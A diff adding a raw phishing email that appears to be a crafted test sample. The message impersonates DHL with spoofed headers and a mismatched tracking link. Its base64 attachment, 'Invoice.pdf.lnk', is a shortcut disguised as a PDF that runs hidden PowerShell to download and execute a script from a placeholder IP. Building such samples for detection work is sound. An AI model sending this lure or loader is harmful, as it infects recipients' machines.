@@ -1,0 +1,37 @@
+Return-Path: <bounce-7731@mailer.shipnotice-dhl.example>
+Received: from mail.shipnotice-dhl.example (mail.shipnotice-dhl.example [203.0.113.77])
+	by mx.corp.example with ESMTP id abc123; Tue, 11 Mar 2025 09:14:02 +0000
+Received: from [10.0.0.5] (unknown [198.51.100.40])
+	by mail.shipnotice-dhl.example; Tue, 11 Mar 2025 09:14:00 +0000
+Authentication-Results: mx.corp.example; spf=fail smtp.mailfrom=shipnotice-dhl.example; dkim=none; dmarc=fail header.from=dhl.com
+From: "DHL Express" <noreply@dhl.com>
+Reply-To: support@dhl-redelivery.example
+To: m.jones@corp.example
+Subject: =?UTF-8?B?WW91ciBwYXJjZWwgaXMgb24gaG9sZCDigJQgYWN0aW9uIG5lZWRlZA==?=
+Date: Tue, 11 Mar 2025 10:14:00 +0100
+Message-ID: <20250311091400.7731@mailer.shipnotice-dhl.example>
+X-Mailer: PHPMailer 6.8.0
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="b1"
+
+--b1
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+<p>Your parcel could not be delivered. <a href=3D"https://dhl-redelivery.example/track?id=3D99">https://www.dhl.com/track</a></p>
+--b1
+Content-Type: application/octet-stream; name="Invoice.pdf.lnk"
+Content-Disposition: attachment; filename="Invoice.pdf.lnk"
+Content-Transfer-Encoding: base64
+
+TAAAAAEUAgAAAAAAwAAAAAAAAEbyAAAAIAAAAAAC3JJTi9sBAEiftlOL2wEA9mgIBS/bAQDoBgAA
+AAAABwAAAAAAAAAAAAAAAAAAAGoAAAAcAAAAAQAAABwAAAAvAAAAAAAAAGkAAAATAAAAAwAAAE08
+KxoQAAAAT1MAQzpcV2luZG93c1xTeXN0ZW0zMlxXaW5kb3dzUG93ZXJTaGVsbFx2MS4wXHBvd2Vy
+c2hlbGwuZXhlAAANAEMAOgBcAFUAcwBlAHIAcwBcAGoAZABvAGUANgAtAHcAIABoAGkAZABkAGUA
+bgAgAC0AbgBvAHAAIAAtAGMAIAAiAGkAZQB4ACgAaQB3AHIAIABoAHQAdABwADoALwAvADEAOQA4
+AC4ANQAxAC4AMQAwADAALgA3AC8AYQAuAHAAcwAxACkAIgAhACUAUwB5AHMAdABlAG0AUgBvAG8A
+dAAlAFwAUwB5AHMAdABlAG0AMwAyAFwAcwBoAGUAbABsADMAMgAuAGQAbABsAGAAAAADAACgWAAA
+AAAAAABkZXNrdG9wLTdmM2syYQAAGjxeb00rjkyaGwwtPk9aawDEDS/L9u8RkjQADClPjjUaPF5v
+TSuOTJobDC0+T1prAMQNL8v27xGSNAAMKU+ONQAAAAA=
+
+--b1--
